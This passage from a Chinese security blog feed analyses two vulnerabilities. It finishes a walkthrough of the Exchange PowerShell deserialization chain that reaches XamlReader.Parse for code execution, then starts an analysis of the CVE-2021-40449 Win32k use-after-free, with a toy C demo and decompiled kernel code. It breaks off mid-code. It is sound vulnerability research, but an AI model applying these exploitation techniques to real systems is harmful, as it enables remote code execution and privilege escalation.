PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (backupTypeTable ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> collection.Add(<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>(<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate&lt;PSMemberInfo>),<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate&lt;PSMemberInfo>),<span style="color:#66d9ef">true</span>,<span style="color:#66d9ef">true</span>,<span style="color:#e6db74">"type table members"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> collection.Add(<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>((PSObject msjObj) => PSObject.TypeTableGetMembersDelegate&lt;PSMemberInfo>(msjObj, backupTypeTable), (PSObject msjObj,<span style="color:#66d9ef">string</span> name) => PSObject.TypeTableGetMemberDelegate&lt;PSMemberInfo>(msjObj, backupTypeTable, name),<span style="color:#66d9ef">true</span>,<span style="color:#66d9ef">true</span>,<span style="color:#e6db74">"type table members"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((viewType &amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> **collection.Add(<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>(<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>.GetMembersDelegate(PSObject.AdapterGetMembersDelegate&lt;PSMemberInfo>),<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>.GetMemberDelegate(PSObject.AdapterGetMemberDelegate&lt;PSMemberInfo>),<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">false</span>,<span style="color:#e6db74">"adapted members"</span>));**</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((viewType &amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> collection.Add(<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>(<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>.GetMembersDelegate(PSObject.DotNetGetMembersDelegate&lt;PSMemberInfo>),<span style="color:#66d9ef">new</span> CollectionEntry&lt;PSMemberInfo>.GetMemberDelegate(PSObject.DotNetGetMemberDelegate&lt;PSMemberInfo>),<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">false</span>,<span style="color:#e6db74">"clr members"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> collection;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span> T AdapterGetMemberDelegate&lt;T>(PSObject msjObj,<span style="color:#66d9ef">string</span> name)<span style="color:#66d9ef">where</span> T : PSMemberInfo</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (!msjObj.isDeserialized)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> T t = msjObj.InternalAdapter.BaseGetMember&lt;T>(msjObj.immediateBaseObject, name);</span></span><span style="display:flex;"><span> PSObject.memberResolution.WriteLine(<span style="color:#e6db74">"Adapted member: {0}."</span>, (t ==<span style="color:#66d9ef">null</span>) ?<span style="color:#e6db74">"not found"</span> : t.Name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> t;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (msjObj.adaptedMembers ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">default</span>(T);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> T t2 = msjObj.adaptedMembers[name]<span style="color:#66d9ef">as</span> T;</span></span><span style="display:flex;"><span> PSObject.memberResolution.WriteLine(<span style="color:#e6db74">"Serialized adapted member: {0}."</span>, (t2 ==<span style="color:#66d9ef">null</span>) ?<span style="color:#e6db74">"not found"</span> : t2.Name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> t2;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>返回到GetPSStandardMember函数中，Exchange会匹配构造函数返回的对象的memberName属性，该属性来源于GetTargetTypeForDeserialization调用时传递的硬编码TargetTypeForDeserialization，即将从该对象中检索名为TargetTypeForDeserialization的值，前面提到过列表内已有该名字的对象，所以将匹配到XamlReader类型的Type对象，并返回给上层函数。</p><p>返回到上层函数，GetTargetTypeForDeserialization返回了XamlReader类型。</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/13.png"/></p><p>进入到ConvertTo函数内，valueToConvert为上层函数ReadOneObject函数传入的obj对象，其内包含了xaml反序列化的命令执行字符串。</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/14.png"/></p><p>进入到LanguagePrimitives.FigureConversion在#3527处断点，此时fromType为String，toType为XamlReader</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/15.png"/></p><p>进入FigureParseConversion内，将会通过反射获取到XamlReader的Parse方法。</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/16.png"/></p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/17.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span> LanguagePrimitives.PSConverter&lt;<span style="color:#66d9ef">object</span>> FigureParseConversion(Type fromType, Type toType)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (fromType ==<span style="color:#66d9ef">typeof</span>(<span style="color:#66d9ef">string</span>))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> MethodInfo methodInfo =<span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> methodInfo = toType.GetMethod(<span style="color:#e6db74">"Parse"</span>, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy,<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">new</span> Type[]</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typeof</span>(<span style="color:#66d9ef">string</span>),</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typeof</span>(IFormatProvider)</span></span><span style="display:flex;"><span> },<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (AmbiguousMatchException ex)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> LanguagePrimitives.typeConversion.WriteLine(<span style="color:#e6db74">"Exception finding Parse method with CultureInfo: \"{0}\"."</span>, ex.Message);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (ArgumentException ex2)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> LanguagePrimitives.typeConversion.WriteLine(<span style="color:#e6db74">"Exception finding Parse method with CultureInfo: \"{0}\"."</span>, ex2.Message);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (methodInfo !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">new</span> LanguagePrimitives.PSConverter&lt;<span style="color:#66d9ef">object</span>>(<span style="color:#66d9ef">new</span> LanguagePrimitives.ConvertViaParseMethod</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> parse = methodInfo</span></span><span style="display:flex;"><span> }.ConvertWithCulture);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> methodInfo = toType.GetMethod(<span style="color:#e6db74">"Parse"</span>, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy,<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">new</span> Type[]</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typeof</span>(<span style="color:#66d9ef">string</span>)</span></span><span style="display:flex;"><span> },<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (AmbiguousMatchException ex3)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> LanguagePrimitives.typeConversion.WriteLine(<span style="color:#e6db74">"Exception finding Parse method: \"{0}\"."</span>, ex3.Message);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (ArgumentException ex4)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> LanguagePrimitives.typeConversion.WriteLine(<span style="color:#e6db74">"Exception finding Parse method: \"{0}\"."</span>, ex4.Message);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (methodInfo !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">new</span> LanguagePrimitives.PSConverter&lt;<span style="color:#66d9ef">object</span>>(<span style="color:#66d9ef">new</span> LanguagePrimitives.ConvertViaParseMethod</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> parse = methodInfo</span></span><span style="display:flex;"><span> }.ConvertWithoutCulture);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>XamlReader.Parse方法将会由LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCulture方法调用。之后就是普通的反序列化过程了。</p><h3 id="小结">小结</h3><p>这个漏洞利用链核心是如何绕过Exchange黑名单类并使Exchange将攻击者控制的指定数据反序列化到指定危险类造成代码执行。</p><p>漏洞利用了Exchange的合法功能，先构造了名为targetTypeForDeserialization 的XamlReader类型的Type对象序列化值，利用Microsoft.Exchange.Data.SerializationTypeConverter的特性返回了XamlReader类型的Type对象，而后ReadProperties将其加入到adaptedMember内。在外层对象反序列化时，构造的PSMembers包含了名为targetTypeForDeserialization的XamlReader类型的Type对象，Exchange会在PSMembers列表内匹配targetTypeForDeserialization项，从而控制了ConvertTo函数转化的目标类XamlReader，Exchange通过反射获取到了XamlReader的Parse方法，调用该方法反序列化攻击者可控的序列化数据，触发代码执行。</p><p>在调试过程中需要将.NET Framework的优化关掉以便dnSpy调试</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[.NET Framework Debugging Control]</span></span></span><span style="display:flex;"><span>GenerateTrackingInfo=<span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>AllowOptimize=<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>COMPlus_ZapDisable=<span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>COMPlus_ReadyToRun=<span style="color:#ae81ff">0</span></span></span></code></pre></div><p><strong>其他</strong></p><p>PSRP：PowerShell Remote Protocol powerShell远程协议，是微软提供的通过SOAP协议上执行PowerShell代码的协议</p><p>参考资料</p><blockquote><p><a href="https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend" target="_blank">https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend</a></p><p><a href="https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell" target="_blank">https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell</a></p></blockquote><p><strong>Created at 2023-05-05T20:35:49+08:00</strong></p></description></item><item><title>CVE-2021-40449 Win32k 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</link><pubDate>Tue, 09 Nov 2021 15:16:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</guid><description><h2 id="cve-2021-40449-win32k提权漏洞及poc分析">CVE-2021-40449 Win32k提权漏洞及POC分析</h2><h3 id="背景">背景</h3><p>CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。</p><h4 id="基本概念">基本概念</h4><p><img alt="aaa" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110112401943.png"/></p><p><strong>内核对象</strong>：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。</p><p><strong>内核对象的引用计数</strong>：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：</p><blockquote><p>在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。</p></blockquote><p><strong>句柄</strong>：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。</p><p><strong>句柄表</strong>：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。</p><blockquote><p><a href="https://www.cnblogs.com/MisterXu/p/10846918.html" target="_blank">https://www.cnblogs.com/MisterXu/p/10846918.html</a></p></blockquote><p><strong>DC</strong>：是一个内核对象，全称device context，设备上下文对象</p><p><strong>HDC</strong>：DC对象的句柄。</p><p><strong>释放后重用</strong>：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。</p><p>eg：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">method</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">badMethod</span>();</span></span><span style="display:flex;"><span><span style="color:#75715e">// 定义函数指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">typedef</span><span style="color:#a6e22e">void</span> (<span style="color:#f92672">*</span>function)();</span></span><span style="display:flex;"><span>class test {</span></span><span style="display:flex;"><span>public:</span></span><span style="display:flex;"><span> function p;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">test</span>() {</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">main</span>() {</span></span><span style="display:flex;"><span><span style="color:#75715e">// new test对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> test<span style="color:#f92672">*</span>t<span style="color:#f92672">=</span> new<span style="color:#a6e22e">test</span>();</span></span><span style="display:flex;"><span> test<span style="color:#f92672">*</span>p<span style="color:#f92672">=</span> t;</span></span><span style="display:flex;"><span> t<span style="color:#f92672">-></span>p<span style="color:#f92672">=</span> method;</span></span><span style="display:flex;"><span> p<span style="color:#f92672">-></span><span style="color:#a6e22e">p</span>();</span></span><span style="display:flex;"><span><span style="color:#75715e">// 释放t指向的test对象的空间</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> delete t;</span></span><span style="display:flex;"><span> test<span style="color:#f92672">*</span>pt;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">10000</span>; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span><span style="color:#75715e">// 占用刚释放的对象的内存空间</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> pt<span style="color:#f92672">=</span> (test<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(test));</span></span><span style="display:flex;"><span><span style="color:#75715e">// 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> pt<span style="color:#f92672">-></span>p<span style="color:#f92672">=</span> badMethod;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 这里原意想要调用method函数，但是实际调用了badMethod函数</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"第二次调用</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span> p<span style="color:#f92672">-></span><span style="color:#a6e22e">p</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">method</span>() {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"method</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">badMethod</span>() {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"bad method</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><img alt="image-20211111123430653" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211111123430653.png"/></p><h4 id="漏洞形成分析">漏洞形成分析</h4><p>该漏洞产生于<strong>win32kfull!GreResetDCInternal</strong>函数中，该函数内会获取DC对象内的函数指针，并执行该函数指针指向的函数，但并未检查DC对象是否异常。所以如果可以在调用函数指针之前释放DC对象，并重新申请该对象的内存空间，通过构造内存布局，修改原DC对象的函数指针指向其他任意内核函数，就可以在win32kfull!GreResetDCInternal内实现<strong>任意内核函数调用</strong>。</p><p>根据代码，我们可以算出DCO对象和DC对象的函数指针的关系：function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针</p><blockquote><p>v10 = *(_QWORD *)(v8 + 48);</p><p>v15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);</p></blockquote><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> __usercall GreResetDCInternal<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">></span>(HDC a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rcx<span style="color:#f92672">></span>,<span style="color:#66d9ef">__int64</span> a2<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rdx<span style="color:#f92672">></span>,<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a3<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>r8<span style="color:#f92672">></span>)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v24;<span style="color:#75715e">// [rsp+50h] [rbp-20h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v25;<span style="color:#75715e">// [rsp+60h] [rbp-10h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> DCOBJ<span style="color:#f92672">::</span><span style="color:#a6e22e">DCOBJ</span>((DCOBJ<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v25, a1);<span style="color:#75715e">// 利用构造函数从HDC创建DCOBJ对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v8<span style="color:#f92672">=</span> v25;</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">··········</span></span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v8<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>);<span style="color:#75715e">// 赋值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">1736</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span> v11;</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">·······</span></span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">512</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span>)<span style="color:#f92672">></span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">·······</span></span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> (HDC)<span style="color:#a6e22e">hdcOpenDCW</span>(<span style="color:#f92672">&amp;</span>qword_1C0141EB0, v26,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2584</span>));<span style="color:#75715e">// 创建新的DC对象，返回对应的HDC句柄</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( v13 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2584</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> DCOBJ<span style="color:#f92672">::</span><span style="color:#a6e22e">DCOBJ</span>((DCOBJ<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v24, v13);</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span> (_QWORD<span style="color:#f92672">*</span>)v24;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v24 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v12 )</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>);</span></span><span style="display:flex;"><span> v14[<span style="color:#ae81ff">308</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2464</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2464</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v14[<span style="color:#ae81ff">309</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2472</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2472</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(_QWORD, _QWORD))(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2768</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v15</span>(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">1824</span>),<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v14[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">1824</span>i64));<span style="color:#75715e">// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#960050;background-color:#1e0010">·······</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">HmgSwapLockedHandleContents</span>(v3,<span style="color:#ae81ff">0</span>i64, v6,<span style="color:#ae81ff">0</span>i64, v23);<span style="color:#75715e">// 交换旧的和新的HDC对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">GreReleaseHmgrSemaphore</span>();</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">······</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bDeleteDCInternal</span>(v6,<span style="color:#ae81ff">1</span>i64,<span style="color:#ae81ff">0</span>i64);<span style="color:#75715e">// 传入了hdcOpenDCW返回的HDC，但HmgSwapLockedHandleContents交换了新旧句柄对应的DC对象，此时v6句柄对应旧DC对象。</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#960050;background-color:#1e0010">······</span></span></span></code></pre></div><p>调用该函数指针的时候，所用的两个参数也是源于用户传入的HDC句柄对应的DC对象。</p><blockquote><p>v10 = *(_QWORD *)(v8 + 48); _</p><p>_v14[308] = *(_QWORD *)(v25 + 2464);</p><p>v14[309] = *(_QWORD *)(v25 + 2472);</p><p>v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));</p></blockquote><p>在win32kfull!GreResetDCInternal函数的后半段会调用win32kbase!DeleteDCInternal函数释放传入该函数的HDC句柄所对应的DC对象，到这里就达成了use-after-free的<strong>free步骤</strong>。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HDC v3;</span></span><span style="display:flex;"><span>v3<span style="color:#f92672">=</span>a1;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span> (HDC)<span style="color:#a6e22e">hdcOpenDCW</span>(<span style="color:#f92672">&amp;</span>qword_1C0141EB0, v26,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2584</span>));<span style="color:#75715e">// 创建新的HDC</span></span></span><span 